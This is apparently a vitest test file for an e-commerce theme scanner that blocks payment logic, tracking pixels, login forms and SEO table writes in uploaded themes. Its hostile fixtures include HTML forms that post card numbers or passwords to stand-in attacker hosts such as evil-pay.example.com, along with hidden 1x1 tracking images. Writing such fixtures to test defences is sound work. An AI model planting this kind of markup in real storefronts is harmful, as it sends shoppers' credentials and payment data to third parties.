/**
 * No-plugin-territory (C6) automated gates — review-policy reasons 1-4.
 *
 * Human review keeps what needs judgment (see report); these four patterns
 * are mechanical enough to refuse in code:
 *  1. payments logic   — theme content that prices/charges
 *  2. tracking pixels  — 1x1/hidden images + known pixel hosts
 *  3. auth forms       — password inputs / credential collection in forms
 *  4. SEO meta writes  — `seo_meta` references inside package content
 *
 * Benign fixtures mirror real catalog defaults (payment_icons marks,
 * cart_summary COD labels, account_cart links, newsletter/contact forms) and
 * must keep passing — display text like "Cash on Delivery" never refuses.
 */
import { describe, expect, it } from "vitest";
import { scanThemeTrustContent } from "./package-review";

const codesOf = (input: unknown): string[] =>
  scanThemeTrustContent(input).map((f) => f.code);

/** Realistic benign theme: catalog defaults + display copy + legit links. */
const BENIGN_TEMPLATES = {
  index: {
    header: [
      {
        id: "h1",
        type: "account_cart",
        props: { accountLabel: "Account", cartLabel: "Cart", showCount: true },
      },
    ],
    main: [
      {
        id: "m1",
        type: "feature_row",
        props: {
          itemOne: "Cash on Delivery",
          itemTwo: "Mobile payments",
          itemThree: "Nationwide shipping",
        },
      },
      {
        id: "m2",
        type: "payment_icons",
        props: {
          heading: "We accept",
          marks: "bKash, Nagad, Rocket, Visa, Mastercard, Cash on delivery",
        },
      },
      {
        id: "m3",
        type: "cart_summary",
        props: {
          heading: "Order summary",
          codLabel: "Cash on delivery fee",
          ctaLabel: "Checkout",
          totalLabel: "Total",
        },
      },
      {
        id: "m4",
        type: "newsletter",
        props: {
          heading: "Stay in touch",
          buttonLabel: "Subscribe",
          emailLabel: "Email",
        },
      },
      {
        id: "m5",
        type: "form",
        props: {
          heading: "Send us a message",
          nameLabel: "Your name",
          emailLabel: "Email",
          phoneLabel: "Phone",
          messageLabel: "How can we help?",
          buttonLabel: "Send",
        },
      },
      {
        id: "m6",
        type: "html",
        props: {
          body: "Follow us",
          markup:
            '<a href="https://facebook.com/ourshop">Facebook</a>' +
            '<img src="https://cdn.example.com/hero.jpg" width="1200" height="800" alt="New arrivals">',
        },
      },
      {
        id: "m7",
        type: "button",
        props: { label: "Pay now", href: "/checkout" },
      },
      {
        id: "m8",
        type: "faq",
        props: {
          heading: "Payments help",
          q1: "Do you offer Cash on Delivery?",
          a1: "Yes — pay the courier in cash when your order arrives.",
        },
      },
    ],
    footer: [],
  },
};

const hostile = (markup: string) => ({
  index: {
    header: [],
    main: [{ id: "x1", type: "html", props: { body: "", markup } }],
    footer: [],
  },
});

describe("scanThemeTrustContent benign content passes", () => {
  it("passes a realistic catalog-default theme with payment display copy", () => {
    expect(scanThemeTrustContent(BENIGN_TEMPLATES)).toEqual([]);
  });

  it("passes plain strings with payment display words", () => {
    expect(
      scanThemeTrustContent(
        "Cash on Delivery available. bKash, Nagad and cards accepted. Total ৳1,250 — pay the courier.",
      ),
    ).toEqual([]);
  });

  it("passes account links and sign-in labels without forms", () => {
    expect(
      scanThemeTrustContent({
        link: "/auth?redirect=/account&mode=signin",
        label: "Sign in to your account",
      }),
    ).toEqual([]);
  });

  it("passes SEO-flavoured copy that writes nothing", () => {
    expect(
      scanThemeTrustContent("An SEO-friendly theme with editable meta titles."),
    ).toEqual([]);
  });

  it("passes a relative-action contact form with no payment fields", () => {
    expect(
      scanThemeTrustContent(
        '<form action="/contact"><input name="name"><input name="email"></form>',
      ),
    ).toEqual([]);
  });

  it("passes normal-sized images and social links", () => {
    expect(
      scanThemeTrustContent(
        '<img src="https://cdn.example.com/a.jpg" width="10" height="10" alt="x">' +
          '<a href="https://facebook.com/shop">fb</a>' +
          "<div>https://fonts.googleapis.com/css?family=x</div>",
      ),
    ).toEqual([]);
  });

  it("passes the existing external-URL prop fixture shape", () => {
    expect(
      scanThemeTrustContent({
        index: {
          header: [],
          main: [
            {
              id: "m1",
              type: "hero",
              props: { pixel: "https://track.example.com/p.gif" },
            },
          ],
          footer: [],
        },
      }),
    ).toEqual([]);
  });
});

describe("scanThemeTrustContent payments gate (C6 reason 1)", () => {
  it("refuses PaymentRequest API refs", () => {
    expect(
      codesOf(hostile("const r = new PaymentRequest(methods, details);")),
    ).toContain("no-plugin-territory.payments");
  });

  it("refuses wallet deeplink schemes", () => {
    expect(codesOf("bkash://pay?to=01700000000&amount=500")).toContain(
      "no-plugin-territory.payments",
    );
    expect(codesOf(hostile("nagad://pay/charge?amount=100"))).toContain(
      "no-plugin-territory.payments",
    );
  });

  it("refuses external-action forms carrying payment fields", () => {
    expect(
      codesOf(
        hostile(
          '<form action="https://evil-pay.example.com/charge">' +
            '<input name="cardNumber"><input name="expiry"><input name="cvc"></form>',
        ),
      ),
    ).toContain("no-plugin-territory.payments");
  });

  it("does not refuse wallet brand names without a deeplink", () => {
    expect(codesOf("Pay with bKash or Nagad on delivery.")).toEqual([]);
  });

  it("does not refuse https links to wallet sites", () => {
    expect(codesOf("See https://www.bkash.com for help.")).toEqual([]);
  });
});

describe("scanThemeTrustContent tracking-pixel gate (C6 reason 3)", () => {
  it("refuses 1x1 images", () => {
    expect(
      codesOf(
        hostile(
          '<img src="https://cdn.example.com/p.png" width="1" height="1" alt="">',
        ),
      ),
    ).toContain("no-plugin-territory.tracking-pixel");
  });

  it("refuses hidden images", () => {
    expect(
      codesOf(
        hostile(
          '<img src="https://cdn.example.com/p.png" style="display:none">',
        ),
      ),
    ).toContain("no-plugin-territory.tracking-pixel");
    expect(
      codesOf(
        hostile(
          '<img src="https://cdn.example.com/p.png" style="width:1px;height:1px">',
        ),
      ),
    ).toContain("no-plugin-territory.tracking-pixel");
  });

  it("refuses known pixel hosts", () => {
    expect(codesOf("https://connect.facebook.net/en_US/fbevents.js")).toContain(
      "no-plugin-territory.tracking-pixel",
    );
    expect(codesOf("https://www.google-analytics.com/g/collect?v=2")).toContain(
      "no-plugin-territory.tracking-pixel",
    );
  });
});

describe("scanThemeTrustContent auth-form gate (C6 reason 4)", () => {
  it("refuses password-type inputs", () => {
    expect(codesOf(hostile('<input type="password" name="pwd">'))).toContain(
      "no-plugin-territory.auth-form",
    );
  });

  it("refuses forms collecting passwords", () => {
    expect(
      codesOf(
        hostile(
          '<form action="https://evil.example.com/go">' +
            '<input name="email"><input name="password"></form>',
        ),
      ),
    ).toContain("no-plugin-territory.auth-form");
  });

  it("refuses login forms collecting identity fields", () => {
    expect(
      codesOf(
        hostile(
          '<form action="https://evil.example.com/login">' +
            "<span>Login</span>" +
            '<input name="email"></form>',
        ),
      ),
    ).toContain("no-plugin-territory.auth-form");
  });

  it("refuses password prop keys smuggled into form sections", () => {
    expect(
      codesOf({
        index: {
          header: [],
          main: [
            {
              id: "f1",
              type: "form",
              props: { passwordLabel: "Password", buttonLabel: "Sign in" },
            },
          ],
          footer: [],
        },
      }),
    ).toContain("no-plugin-territory.auth-form");
  });

  it("passes email-only inputs outside any form", () => {
    expect(codesOf('<input type="email" name="newsletter-email">')).toEqual([]);
  });
});

describe("scanThemeTrustContent seo-write gate (C6 reason 2)", () => {
  it("refuses seo_meta references in package content", () => {
    expect(
      codesOf(hostile('await db.from("seo_meta").insert(row);')),
    ).toContain("no-plugin-territory.seo-write");
  });

  it("passes the word meta without the table name", () => {
    expect(codesOf("Edit the meta title and meta description.")).toEqual([]);
  });
});

describe("scanPackage wires the trust gates (install/activation lane)", () => {
  const file = (path: string, content: string) => ({
    path,
    bytes: new TextEncoder().encode(content),
  });

  it("flags theme files with payment markup as high severity", async () => {
    const { scanPackage } = await import("./package-scan");
    const report = scanPackage([
      file(
        "templates/index.json",
        JSON.stringify(
          hostile(
            '<form action="https://evil-pay.example.com/charge">' +
              '<input name="cardNumber"></form>',
          ),
        ),
      ),
    ]);
    expect(report.verdict).toBe("flagged");
    expect(report.findings).toContainEqual({
      code: "no-plugin-territory.payments",
      severity: "high",
      detail: expect.stringContaining("templates/index.json"),
    });
  });

  it("flags tracking pixels, auth forms and seo writes with dedicated codes", async () => {
    const { scanPackage } = await import("./package-scan");
    const report = scanPackage([
      file(
        "templates/index.json",
        JSON.stringify(
          hostile(
            '<img src="https://cdn.example.com/p.png" width="1" height="1">' +
              '<input type="password" name="p">' +
              "insert into seo_meta",
          ),
        ),
      ),
    ]);
    const codes = report.findings.map((f) => f.code);
    expect(codes).toContain("no-plugin-territory.tracking-pixel");
    expect(codes).toContain("no-plugin-territory.auth-form");
    expect(codes).toContain("no-plugin-territory.seo-write");
    expect(
      report.findings
        .filter((f) => f.code.startsWith("no-plugin-territory."))
        .every((f) => f.severity === "high"),
    ).toBe(true);
  });

  it("leaves plugin manifests to the plugin rails (theme gates do not apply)", async () => {
    const { scanPackage } = await import("./package-scan");
    const report = scanPackage([
      file(
        "plugin.json",
        JSON.stringify({
          id: "bkash-pay",
          description: "Pay with bKash. bkash://pay supported.",
        }),
      ),
    ]);
    expect(
      report.findings.filter((f) => f.code.startsWith("no-plugin-territory.")),
    ).toEqual([]);
  });

  it("keeps ordinary theme content clean", async () => {
    const { scanPackage } = await import("./package-scan");
    const report = scanPackage([
      file("theme.json", JSON.stringify({ key: "t", version: "1.0.0" })),
      file("templates/index.json", JSON.stringify(BENIGN_TEMPLATES.index)),
      file("styles/main.css", "a{color:red}"),
    ]);
    expect(report.verdict).toBe("clean");
  });
});

describe("validateThemeManifest refuses trust violations at install", () => {
  const base = () => ({
    key: "trust-gated",
    name: "Trust Gated",
    nameBn: "ট্রাস্ট",
    version: "1.0.0",
    api: "^3.0.0",
    templates: ["index"],
    presentationSurfaces: ["widget"],
    locales: ["en"],
    capabilities: ["render_storefront"],
  });

  const errorsOf = async (input: unknown): Promise<string[]> => {
    const { validateThemeManifest } = await import("./theme-package");
    const verdict = validateThemeManifest(input);
    expect(verdict.ok).toBe(false);
    return verdict.ok ? [] : verdict.errors;
  };

  it("refuses PaymentRequest refs in display copy", async () => {
    expect(
      await errorsOf({
        ...base(),
        description: "Pay with PaymentRequest express checkout.",
      }),
    ).toContain("content.payments");
  });

  it("refuses wallet deeplinks in display copy", async () => {
    expect(
      await errorsOf({ ...base(), description: "Top up via bkash://pay." }),
    ).toContain("content.payments");
  });

  it("refuses password inputs in display copy", async () => {
    expect(
      await errorsOf({
        ...base(),
        description: 'Sign in here <input type="password" name="p">',
      }),
    ).toContain("content.auth-form");
  });

  it("refuses 1x1 pixel markup in display copy", async () => {
    expect(
      await errorsOf({
        ...base(),
        description:
          'Badge <img src="https://cdn.example.com/b.png" width="1" height="1">',
      }),
    ).toContain("content.tracking-pixel");
  });

  it("refuses seo_meta references in display copy", async () => {
    expect(
      await errorsOf({
        ...base(),
        description: "Syncs rows into seo_meta automatically.",
      }),
    ).toContain("content.seo-write");
  });

  it("passes benign payment display copy", async () => {
    const { validateThemeManifest } = await import("./theme-package");
    const verdict = validateThemeManifest({
      ...base(),
      description: "Shows Cash on Delivery and bKash marks in the footer.",
    });
    expect(verdict.ok).toBe(true);
  });
});

describe("composePublishGate refuses trust violations at publish", () => {
  it("blocks hostile templates with stable machine codes", async () => {
    const { composePublishGate } = await import("./publish-gates");
    const { DEFAULT_TOKENS } = await import("./builder-ast");
    const gate = composePublishGate({
      tokens: DEFAULT_TOKENS,
      trust: hostile(
        '<form action="https://evil-pay.example.com/charge">' +
          '<input name="cardNumber"></form>',
      ),
    });
    expect(gate.ok).toBe(false);
    expect(gate.failures.map((f) => f.code)).toContain(
      "no-plugin-territory.payments",
    );
  });

  it("blocks every trust gate through the composed gate", async () => {
    const { composePublishGate } = await import("./publish-gates");
    const { DEFAULT_TOKENS } = await import("./builder-ast");
    const gate = composePublishGate({
      tokens: DEFAULT_TOKENS,
      trust: hostile(
        '<img src="https://cdn.example.com/p.png" width="1" height="1">' +
          '<input type="password" name="p">' +
          "insert into seo_meta",
      ),
    });
    const codes = gate.failures.map((f) => f.code);
    expect(codes).toContain("no-plugin-territory.tracking-pixel");
    expect(codes).toContain("no-plugin-territory.auth-form");
    expect(codes).toContain("no-plugin-territory.seo-write");
  });

  it("adds nothing for benign templates", async () => {
    const { composePublishGate } = await import("./publish-gates");
    const { DEFAULT_TOKENS } = await import("./builder-ast");
    const gate = composePublishGate({
      tokens: DEFAULT_TOKENS,
      trust: BENIGN_TEMPLATES,
    });
    expect(
      gate.failures.filter((f) => f.code.startsWith("no-plugin-territory.")),
    ).toEqual([]);
  });
});
